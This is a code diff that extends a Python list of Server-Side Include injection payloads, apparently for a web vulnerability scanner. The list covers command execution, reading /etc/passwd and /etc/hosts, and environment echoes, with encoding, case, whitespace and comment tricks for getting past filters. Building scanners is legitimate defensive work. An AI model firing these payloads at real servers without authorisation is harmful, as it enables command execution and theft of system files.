@@ -40,27 +40,60 @@ def _logger():
 
 # SSI Injection payloads
 SSI_PAYLOADS = [
-    # Basic SSI command execution
+    # ── BASIC SSI COMMAND EXECUTION ───────────────────────────────────────────
     ('<!--#exec cmd="id"-->', ["uid=", "gid="], "SSI command execution (id)"),
     ('<!--#exec cmd="whoami"-->', ["root", "www-data", "apache", "nginx"], "SSI command execution (whoami)"),
     ('<!--#exec cmd="cat /etc/passwd"-->', ["root:x:", "bin:x:"], "SSI file read (/etc/passwd)"),
+    ('<!--#exec cmd="ls /etc"-->', ["passwd", "hosts", "shadow"], "SSI directory listing"),
+    ('<!--#exec cmd="uname -a"-->', ["linux", "GNU"], "SSI system info"),
+    ('<!--#exec cmd="hostname"-->', ["."], "SSI hostname"),
 
-    # SSI file inclusion
+    # ── SSI FILE INCLUSION ────────────────────────────────────────────────────
     ('<!--#include virtual="/etc/passwd"-->', ["root:x:", "bin:x:"], "SSI file inclusion (/etc/passwd)"),
     ('<!--#include file="/etc/passwd"-->', ["root:x:", "bin:x:"], "SSI file inclusion (file=)"),
+    ('<!--#include virtual="/etc/hosts"-->', ["localhost", "127.0.0.1"], "SSI file inclusion (/etc/hosts)"),
 
-    # SSI echo (environment variables)
+    # ── SSI ECHO (ENVIRONMENT VARIABLES) ──────────────────────────────────────
     ('<!--#echo var="DOCUMENT_ROOT"-->', ["/var/www", "/usr/share", "/home"], "SSI echo DOCUMENT_ROOT"),
     ('<!--#echo var="SERVER_NAME"-->', [], "SSI echo SERVER_NAME"),
+    ('<!--#echo var="SERVER_SOFTWARE"-->', ["nginx", "apache"], "SSI echo SERVER_SOFTWARE"),
+    ('<!--#echo var="REQUEST_URI"-->', [], "SSI echo REQUEST_URI"),
+    ('<!--#echo var="REMOTE_ADDR"-->', [], "SSI echo REMOTE_ADDR"),
+    ('<!--#echo var="HTTP_HOST"-->', [], "SSI echo HTTP_HOST"),
 
-    # SSI date/time (less dangerous but confirms SSI)
+    # ── SSI DATE/TIME (CONFIRMS SSI) ─────────────────────────────────────────
     ('<!--#echo var="DATE_LOCAL"-->', [], "SSI date echo"),
     ('<!--#config timefmt="%A %d %B %Y"-->', [], "SSI config timefmt"),
+    ('<!--#config timefmt="%H:%M:%S"-->', [], "SSI config timefmt (time)"),
 
-    # SSI with payload variations
+    # ── SSI WITH PAYLOAD VARIATIONS ───────────────────────────────────────────
     ('<!--#exec cmd="id" -->', ["uid=", "gid="], "SSI with spaces"),
     ('<!--#EXEC cmd="id"-->', ["uid=", "gid="], "SSI uppercase EXEC"),
     ('<!--#exec cmd="id"-->', ["uid=", "gid="], "SSI lowercase cmd"),
+    ('<!--#EXEC CMD="id"-->', ["uid=", "gid="], "SSI all uppercase"),
+
+    # ── ENCODING BYPASS PAYLOADS ──────────────────────────────────────────────
+    ('<!--#exec cmd="id"-->', ["uid=", "gid="], "SSI standard encoding"),
+    ('&lt;!--#exec cmd=&quot;id&quot;--&gt;', ["uid=", "gid="], "SSI HTML entity encoding"),
+    ('&#60;!--#exec cmd=&quot;id&quot;--&#62;', ["uid=", "gid="], "SSI numeric entity encoding"),
+    ('%3C!--%23exec%20cmd%3D%22id%22--%3E', ["uid=", "gid="], "SSI URL encoding"),
+
+    # ── CASE VARIATION PAYLOADS ───────────────────────────────────────────────
+    ('<!--#EXEC CMD="id"-->', ["uid=", "gid="], "SSI mixed case EXEC"),
+    ('<!--#exec Cmd="id"-->', ["uid=", "gid="], "SSI mixed case cmd"),
+
+    # ── WHITESPACE BYPASS PAYLOADS ────────────────────────────────────────────
+    ('<!--#exec\tcmd="id"-->', ["uid=", "gid="], "SSI tab in directive"),
+    ('<!--#exec\ncmd="id"-->', ["uid=", "gid="], "SSI newline in directive"),
+    ('<!--#exec cmd ="id"-->', ["uid=", "gid="], "SSI space before equals"),
+
+    # ── COMMENT BYPASS PAYLOADS ───────────────────────────────────────────────
+    ('<!---->#exec cmd="id"-->', ["uid=", "gid="], "SSI comment bypass"),
+    ('<!-- --!>#exec cmd="id"-->', ["uid=", "gid="], "SSI reversed comment"),
+
+    # ── BLIND SSI DETECTION ───────────────────────────────────────────────────
+    ('<!--#config timefmt="test123"-->', [], "SSI blind config test"),
+    ('<!--#exec cmd="echo test"-->', [], "SSI blind exec test"),
 ]
 
 
